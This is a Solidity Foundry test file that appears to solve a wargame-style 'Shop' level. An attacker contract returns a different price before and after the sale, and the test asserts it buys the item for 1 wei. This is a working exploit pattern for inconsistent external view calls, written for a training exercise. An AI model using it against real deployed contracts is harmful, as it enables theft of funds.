// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Shop} from "../src/Shop.sol";     


// │                    Attacker / Exploit contract                │

contract ShopAttacker {
    Shop public immutable shop;

    constructor(address _shop) {
        shop = Shop(_shop);
    }

    function price() external view returns (uint) {
        return shop.isSold() ? 1 : 100;
    }

    function attack() external {
        shop.buy();
    }
}

// 
//                            TESTS                              

contract ShopExploitTest is Test {
    Shop level;
    ShopAttacker attacker;
    address player = makeAddr("player");

    function setUp() public {
        level = new Shop();
        attacker = new ShopAttacker(address(level));
        vm.deal(player, 1 ether);
    }

    function test_exploit_via_attacker_contract() public {
        vm.startPrank(player);

        assertEq(level.price(), 100, "initial price should be 100");
        assertFalse(level.isSold(), "should not be sold yet");

        attacker.attack();

        assertTrue(level.isSold(), "should be sold after exploit");
        assertEq(level.price(), 1, "should have bought for 1 wei");

        vm.stopPrank();
    }

    
}